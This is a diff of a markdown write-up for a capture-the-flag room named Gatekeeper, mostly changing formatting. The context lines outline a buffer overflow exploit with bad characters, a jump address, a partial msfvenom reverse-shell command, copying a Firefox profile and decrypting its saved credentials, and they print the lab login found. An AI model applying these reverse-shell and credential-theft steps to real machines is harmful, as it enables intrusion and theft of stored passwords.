@@ -121,10 +121,12 @@ Host script results:
 * 3389: vulnerable to RCE (MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability)
 * Path shared with read access: \\10.10.131.92\Users
 * 31337: Service that support an input (Vulnerable to BOF?)
+
 ![225b9767c015c5dc2281f6b27837c73f.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/225b9767c015c5dc2281f6b27837c73f.png)
 
 # Explotation
-Let's see the smb share /Users
+Let's see the smb share `/Users`
+
 ![3513999b163e6713dc95990cfbb31dd8.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/3513999b163e6713dc95990cfbb31dd8.png)
 
 What does that binary do? After testing it in a WIN test machine, it seems the same program that the one is running on the target machine in the port 31337. So next step is test it for BOF with Immunity Debugger, mona and manual tools with python:
@@ -149,6 +151,7 @@ We are able to write in memory. What characters we are not abe to use?
 \x00\x0a
 
 And were are the jump funcions to execute code?
+
 ![ec623ef17e986058ca4c20d52c2a4126.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/ec623ef17e986058ca4c20d52c2a4126.png)
 
 \xc3\x14\x04\x08
@@ -160,12 +163,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$l_ip LPORT=4444 EXITFUNC=thread -b 
 ```
 
 Adding to the BOF exploit, we have a shell in our lab:
+
 ![7311b02635c4b055dcbc25a70f8a83e5.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/7311b02635c4b055dcbc25a70f8a83e5.png)
 
 # Post-explotation
 
 ## Spawn a shell - User flag
 Let's test the room:
+
 ![da76808c6fbdcc7a443f33a0b021eb87.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/da76808c6fbdcc7a443f33a0b021eb87.png)
 
 It works!
@@ -341,6 +346,7 @@ wmpnetwk.exe                  1356 Services                   0      2,572 K
 ```
 
 Firefox is installed and the current user seems used it, there are data in the local AppData:
+
 ![993110a4059958dab56f8ce0841ce656.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/993110a4059958dab56f8ce0841ce656.png)
 
 ```
@@ -379,13 +385,16 @@ xcopy /S /I /E C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a
 ```
 
 Download it:
+
 ![5b757520c9b8f458c3020869d7e4e1d1.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/5b757520c9b8f458c3020869d7e4e1d1.png)
 
-And decrypt the creds with https://github.com/unode/firefox_decrypt :
+And decrypt the creds with https://github.com/unode/firefox_decrypt:
+
 ![2876d918fb1654b27d6a33150bebaeca.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/2876d918fb1654b27d6a33150bebaeca.png)
 
 Username: 'mayor'
 Password: '8CL7O1N78MdrCIsV'
 
 Using this creds to log in with RDP:
+
 ![93000f140fbd30678d574650816c4667.png](https://raw.githubusercontent.com/mor88888888/writeups/main/gatekeeper/_resources/93000f140fbd30678d574650816c4667.png)
